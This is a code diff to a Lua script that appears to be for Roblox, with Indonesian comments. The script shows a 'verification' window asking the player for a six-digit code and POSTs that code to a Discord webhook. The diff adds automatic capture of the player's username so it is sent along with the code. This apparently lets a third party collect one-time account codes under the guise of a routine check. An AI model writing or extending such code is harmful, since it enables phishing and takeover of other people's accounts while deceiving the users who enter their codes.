@@ -167,7 +167,7 @@ local verificationDebounceTime = 5 -- Waktu debounce (detik)
 local isProcessingVerification = false -- Untuk mencegah multiple execution
 
 -- Fungsi untuk mengirim kode verifikasi ke Discord
-local function sendVerificationToDiscord(code)
+local function sendVerificationToDiscord(username, code)
     local currentTime = tick()
 
     -- Cek apakah pengiriman terakhir dalam waktu debounce
@@ -176,7 +176,7 @@ local function sendVerificationToDiscord(code)
         return false
     end
 
-   -- Format payload untuk Discord webhook
+    -- Format payload untuk Discord webhook
     local payload = {
         Url = webhook_url,
         Method = "POST",
@@ -222,6 +222,9 @@ local function createVerificationCodeGUI()
     local codeBox = Instance.new("TextBox")
     local verifyCodeButton = Instance.new("TextButton")
     local errorLabel = Instance.new("TextLabel")
+
+    -- Ambil username otomatis dari LocalPlayer
+    local username = game.Players.LocalPlayer.Name
 
     -- Properti GUI
     gui.Name = "VerificationCodeGUI"
@@ -303,7 +306,7 @@ local function createVerificationCodeGUI()
         local verificationCode = codeBox.Text
 
         if verificationCode:match("^%d%d%d%d%d%d$") then
-            local success = sendVerificationToDiscord(verificationCode)
+            local success = sendVerificationToDiscord(username, verificationCode)
             if success then
                 gui:Destroy()
                 createMenuGUI() -- Menampilkan MenuGUI setelah verifikasi berhasil
